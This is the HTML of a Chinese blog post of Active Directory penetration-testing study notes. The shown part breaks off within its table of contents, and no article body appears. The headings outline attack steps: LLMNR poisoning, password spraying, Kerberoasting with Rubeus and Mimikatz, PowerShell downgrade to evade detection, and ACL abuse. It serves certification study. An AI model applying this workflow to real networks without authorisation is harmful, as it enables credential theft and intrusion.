<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="域渗透小思路以及笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="AD Notes">
<meta property="og:url" content="http://c2tsh4rk.github.io/2025/03/04/ADNotes/index.html">
<meta property="og:site_name" content="Try Harder!">
<meta property="og:description" content="域渗透小思路以及笔记">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-03-04T09:34:30.000Z">
<meta property="article:modified_time" content="2025-03-13T03:56:07.413Z">
<meta property="article:author" content="c2tsh4rk">
<meta property="article:tag" content="CPTS">
<meta property="article:tag" content="CAPE">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AD Notes</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/c2tsh4rk">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/03/17/Pivoting-Tunneling-and-Port-Forwarding/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/02/19/Password-Attacks/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://c2tsh4rk.github.io/2025/03/04/ADNotes/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&text=AD Notes"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&is_video=false&description=AD Notes"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AD Notes&body=Check out this article: http://c2tsh4rk.github.io/2025/03/04/ADNotes/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&name=AD Notes&description=域渗透小思路以及笔记"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&t=AD Notes"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E5%88%9D%E5%A7%8B%E4%BE%A6%E6%9F%A5%E5%88%B0%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">从初始侦查到获取立足点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-osint%E8%8E%B7%E5%8F%96%E5%88%B0%E4%BB%BB%E4%BD%95%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">1. osint获取到任何有价值的用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E4%BE%A6%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2. 本地账户侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBT-NS-Poisoning"><span class="toc-number">1.2.1.</span> <span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">3. 枚举密码策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-NULL"><span class="toc-number">1.3.1.</span> <span class="toc-text">SMB NULL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Anomynous"><span class="toc-number">1.3.2.</span> <span class="toc-text">LDAP Anomynous</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D%E5%88%97%E8%A1%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4. 获取用户名列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-NULL-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">SMB NULL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Anonymous"><span class="toc-number">1.4.2.</span> <span class="toc-text">LDAP Anonymous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerbrute-%E9%80%9A%E8%BF%87Kerberos-Pre-Authentication"><span class="toc-number">1.4.3.</span> <span class="toc-text">Kerbrute(通过Kerberos Pre-Authentication)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">1.5.</span> <span class="toc-text">5. 密码喷洒</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AD-%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90%E5%90%8E%E7%9A%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.</span> <span class="toc-text">AD 获取初始权限后的枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"><span class="toc-number">2.1.</span> <span class="toc-text">1. 枚举安全控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9E%9A%E4%B8%BEAppLocker%E7%AD%96%E7%95%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2. 枚举AppLocker策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-Get-AppLockerPolicy-Effective-%E7%BB%93%E6%9E%9C"><span class="toc-number">2.2.1.</span> <span class="toc-text">解析 Get-AppLockerPolicy -Effective 结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">3. 枚举语言模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BELAPS"><span class="toc-number">2.4.</span> <span class="toc-text">4. 枚举LAPS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E5%90%8E%E7%9A%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.</span> <span class="toc-text">获取一个域用户凭据后的枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-CME-%E5%9F%9F%E7%94%A8%E6%88%B7-%E7%BB%84-%E5%B7%B2%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7-share%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMBMap-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5-%E9%80%92%E5%BD%92%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text">2. SMBMap - 访问权限检查&#x2F;递归目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-rpcclient-%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.</span> <span class="toc-text">3. rpcclient 枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-RID-%E8%BF%9B%E8%A1%8C-RPCClient-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.1.</span> <span class="toc-text">通过 RID 进行 RPCClient 用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumdomusers-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">3.3.2.</span> <span class="toc-text">Enumdomusers 枚举域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Impacket-%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-number">3.4.</span> <span class="toc-text">4. Impacket 工具包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-psexec-py"><span class="toc-number">3.4.1.</span> <span class="toc-text">使用 psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">3.4.2.</span> <span class="toc-text">wmiexec.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Windapsearch"><span class="toc-number">3.5.</span> <span class="toc-text">5. Windapsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windapsearch-%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98-%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7"><span class="toc-number">3.5.1.</span> <span class="toc-text">Windapsearch - 域管理员&#x2F;特权用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-BloodHound-py"><span class="toc-number">3.6.</span> <span class="toc-text">6. BloodHound.py</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-BloodHound-py"><span class="toc-number">3.6.1.</span> <span class="toc-text">执行 BloodHound.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-ActiveDirectory-PowerShell-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.</span> <span class="toc-text">7. ActiveDirectory PowerShell 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.1.</span> <span class="toc-text">发现模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD-ActiveDirectory-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.2.</span> <span class="toc-text">加载 ActiveDirectory 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.7.3.</span> <span class="toc-text">获取域信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-ADUser"><span class="toc-number">3.7.4.</span> <span class="toc-text">Get-ADUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">3.7.5.</span> <span class="toc-text">检查信任关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.7.6.</span> <span class="toc-text">组枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-number">3.7.7.</span> <span class="toc-text">详细组信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">3.7.8.</span> <span class="toc-text">组成员身份</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-PowerView"><span class="toc-number">3.8.</span> <span class="toc-text">8. PowerView</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">3.8.1.</span> <span class="toc-text">域用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">3.8.2.</span> <span class="toc-text">递归组成员身份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.8.3.</span> <span class="toc-text">信任枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%B5%8B%E8%AF%95"><span class="toc-number">3.8.4.</span> <span class="toc-text">本地管理员访问权限测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%B7%B2%E8%AE%BE%E7%BD%AE-SPN-%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">3.8.5.</span> <span class="toc-text">查找已设置 SPN 的用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SharpView"><span class="toc-number">3.9.</span> <span class="toc-text">9. SharpView</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%9C%89%E5%85%B3%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.9.1.</span> <span class="toc-text">枚举有关特定用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-Snaffler"><span class="toc-number">3.10.</span> <span class="toc-text">10. Snaffler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Snaffler-%E6%89%A7%E8%A1%8C"><span class="toc-number">3.10.1.</span> <span class="toc-text">Snaffler 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snaffler-%E5%AE%9E%E6%88%98"><span class="toc-number">3.10.2.</span> <span class="toc-text">Snaffler 实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-BloodHound"><span class="toc-number">3.11.</span> <span class="toc-text">11. BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SharpHound-%E5%AE%9E%E6%88%98"><span class="toc-number">3.11.1.</span> <span class="toc-text">SharpHound 实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Living-Off-the-Land"><span class="toc-number">4.</span> <span class="toc-text">Living Off the Land</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E7%9A%84%E7%8E%AF%E5%A2%83%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">主机与网络侦察的环境命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-PowerShell"><span class="toc-number">4.2.</span> <span class="toc-text">利用 PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%8D%E7%BA%A7-PowerShell-%E6%9B%B4%E5%8A%A0opsec"><span class="toc-number">4.2.1.</span> <span class="toc-text">降级 PowerShell(更加opsec)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">4.2.2.</span> <span class="toc-text">检查防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Defender-%E6%A3%80%E6%9F%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">Windows Defender 检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-MpComputerStatus"><span class="toc-number">4.2.4.</span> <span class="toc-text">Get-MpComputerStatus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Am-I-Alone"><span class="toc-number">4.3.</span> <span class="toc-text">Am I Alone?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-qwinsta"><span class="toc-number">4.3.1.</span> <span class="toc-text">使用 qwinsta</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">4.4.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E7%AE%A1%E7%90%86%E8%A7%84%E8%8C%83-WMI"><span class="toc-number">4.5.</span> <span class="toc-text">Windows 管理规范 (WMI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-Commands"><span class="toc-number">4.6.</span> <span class="toc-text">Net Commands</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%9F%9F%E7%BB%84"><span class="toc-number">4.6.1.</span> <span class="toc-text">列出域组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-Command%E6%8A%80%E5%B7%A7"><span class="toc-number">4.6.2.</span> <span class="toc-text">Net Command技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dsquery-%E7%94%A8%E6%88%B7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%90%9C%E7%B4%A2"><span class="toc-number">4.7.</span> <span class="toc-text">Dsquery 用户&#x2F;计算机搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%90%9C%E7%B4%A2"><span class="toc-number">4.7.1.</span> <span class="toc-text">通配符搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E6%9C%89%E7%89%B9%E5%AE%9A%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%94%A8%E6%88%B7-PASSWD-NOTREQD"><span class="toc-number">4.7.2.</span> <span class="toc-text">具有特定属性设置的用户 (PASSWD_NOTREQD)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">4.7.3.</span> <span class="toc-text">搜索域控制器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">横向移动和权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-with-GetUserSPNs-py"><span class="toc-number">5.1.</span> <span class="toc-text">Kerberoasting with GetUserSPNs.py</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-py-%E5%88%97%E5%87%BA-SPN-%E8%B4%A6%E6%88%B7"><span class="toc-number">5.1.1.</span> <span class="toc-text">使用 GetUserSPNs.py 列出 SPN 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%89%80%E6%9C%89-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.1.2.</span> <span class="toc-text">请求所有 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%8D%95%E4%B8%AA-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.1.3.</span> <span class="toc-text">请求单个 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-TGS-%E7%A5%A8%E6%8D%AE%E4%BF%9D%E5%AD%98%E5%88%B0%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.4.</span> <span class="toc-text">将 TGS 票据保存到输出文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E6%B5%8B%E8%AF%95%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.1.5.</span> <span class="toc-text">针对域控制器测试身份验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-%E5%8D%8A%E6%89%8B%E5%8A%A8%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">Kerberoasting - 半手动方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-setspn-exe-%E6%9E%9A%E4%B8%BE-SPN"><span class="toc-number">5.2.1.</span> <span class="toc-text">使用 setspn.exe 枚举 SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Targeting-a-Single-User"><span class="toc-number">5.2.2.</span> <span class="toc-text">Targeting a Single User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-setspn-exe-%E6%A3%80%E7%B4%A2%E6%89%80%E6%9C%89%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.2.3.</span> <span class="toc-text">使用 setspn.exe 检索所有票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.3.</span> <span class="toc-text">使用 Mimikatz 从内存中提取票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E7%94%A8%E4%BA%8E%E7%A0%B4%E8%A7%A3%E7%9A%84-Base64-Blob"><span class="toc-number">5.3.1.</span> <span class="toc-text">准备用于破解的 Base64 Blob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%BE%93%E5%87%BA%E4%BF%9D%E5%AD%98%E4%B8%BA-kirbi-%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.2.</span> <span class="toc-text">将输出保存为 .kirbi 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.3.3.</span> <span class="toc-text">执行破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96-%E5%B7%A5%E5%85%B7%E5%8C%96%E8%B7%AF%E7%BA%BF"><span class="toc-number">5.4.</span> <span class="toc-text">自动化&#x2F;工具化路线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%8F%90%E5%8F%96-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.4.1.</span> <span class="toc-text">使用 PowerView 提取 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E9%92%88%E5%AF%B9%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7"><span class="toc-number">5.4.2.</span> <span class="toc-text">使用 PowerView 针对特定用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%89%80%E6%9C%89%E7%A5%A8%E6%8D%AE%E5%88%B0-CSV-%E6%96%87%E4%BB%B6"><span class="toc-number">5.4.3.</span> <span class="toc-text">导出所有票据到 CSV 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus"><span class="toc-number">5.4.4.</span> <span class="toc-text">使用 Rubeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-stats-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.5.</span> <span class="toc-text">使用 &#x2F;stats 标志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-nowrap-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.6.</span> <span class="toc-text">使用 &#x2F;nowrap 标志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%94%AF%E6%8C%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.4.7.</span> <span class="toc-text">检查支持的加密类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B0%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.4.8.</span> <span class="toc-text">请求新票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-Hashcat-%E5%B9%B6%E6%A3%80%E6%9F%A5%E7%A0%B4%E8%A7%A3%E4%BB%BB%E5%8A%A1%E7%8A%B6%E6%80%81"><span class="toc-number">5.4.9.</span> <span class="toc-text">运行 Hashcat 并检查破解任务状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A0%B4%E8%A7%A3%E6%89%80%E9%9C%80%E6%97%B6%E9%97%B4"><span class="toc-number">5.4.10.</span> <span class="toc-text">查看破解所需时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-tgtdeleg-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.11.</span> <span class="toc-text">使用 &#x2F;tgtdeleg 标志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACL%E6%BB%A5%E7%94%A8"><span class="toc-number">6.</span> <span 